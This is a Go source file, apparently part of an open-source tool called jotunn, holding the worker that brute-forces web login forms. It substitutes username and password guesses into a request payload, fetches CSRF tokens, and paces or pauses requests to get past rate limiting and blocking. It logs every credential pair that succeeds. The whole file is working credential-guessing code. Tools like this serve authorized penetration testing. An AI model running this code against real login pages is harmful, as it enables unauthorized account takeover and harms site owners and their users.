package attack

import (
	"io"
	"net/http"
	"strings"
	"sync"

	"github.com/LinharesAron/jotunn/internal/config"
	"github.com/LinharesAron/jotunn/internal/core"
	"github.com/LinharesAron/jotunn/internal/httpclient"
	"github.com/LinharesAron/jotunn/internal/logger"
	"github.com/LinharesAron/jotunn/internal/throttle"
	"github.com/LinharesAron/jotunn/internal/types"
	"github.com/LinharesAron/jotunn/internal/utils"
)

type Attack struct {
	dispatcher *core.Dispatcher
	throttle   throttle.Throttler
	cfg        *config.AttackConfig
}

func NewAttack(cfg *config.AttackConfig, dispatcher *core.Dispatcher, thorttle throttle.Throttler) types.WorkerHandler {
	return &Attack{
		dispatcher: dispatcher,
		cfg:        cfg,
		throttle:   thorttle,
	}
}

func (a *Attack) Start(id int, wg *sync.WaitGroup, input <-chan types.Attempt) {
	defer wg.Done()

	client := httpclient.Get()

	for attempt := range input {
		a.throttle.WaitIfBlocked()
		a.throttle.WaitCadence()
		a.throttle.RegisterRequest()

		payload := strings.ReplaceAll(a.cfg.Payload, "^USER^", attempt.Username)
		payload = strings.ReplaceAll(payload, "^PASS^", attempt.Password)

		if a.cfg.CSRFField != "" {
			csrfToken, statusCode, err := utils.RetrieveCSRFToken(client, a.cfg.CSRFField, a.cfg.CSRFSourceURL)
			if err != nil {
				if a.throttle.HandleThrottle(statusCode, a.dispatcher, attempt) {
					continue
				}

				logger.Error("[Worker %d] CSRF failed: %v", id, err)
				continue
			}

			payload = strings.ReplaceAll(payload, "^CSRF^", csrfToken)
		}

		var req *http.Request
		var err error

		if strings.ToUpper(a.cfg.Method) == "GET" {
			urlWithQuery := a.cfg.URL + "?" + payload
			req, err = http.NewRequest(a.cfg.Method, urlWithQuery, nil)
		} else {
			req, err = http.NewRequest(a.cfg.Method, a.cfg.URL, strings.NewReader(payload))
		}

		if err != nil {
			logger.Error("[Worker %d] Request creation error: %v\n", id, err)
			continue
		}

		for k, v := range a.cfg.Headers {
			req.Header.Set(k, v)
		}

		resp, err := client.Do(req)
		if err != nil {
			logger.Error("[Worker %d] Request error: %v\n", id, err)
			continue
		}
		defer resp.Body.Close()

		statusCode := resp.StatusCode
		if a.throttle.HandleThrottle(statusCode, a.dispatcher, attempt) {
			continue
		}

		bodyBytes, err := io.ReadAll(resp.Body)
		if err != nil {
			logger.Error("[Worker %d] Failed to read response body: %v", id, err)
			continue
		}

		if isValidResponse(a.cfg, string(bodyBytes)) {
			logger.Success("🎯 [Worker %d] Valid username:password → %s:%s", id, attempt.Username, attempt.Password)
		}

		a.throttle.MarkRecovered()
		logger.Progress.Inc()
	}
}

func isValidResponse(cfg *config.AttackConfig, body string) bool {
	success, keyword := cfg.Keyword()
	return success == strings.Contains(body, keyword)
}
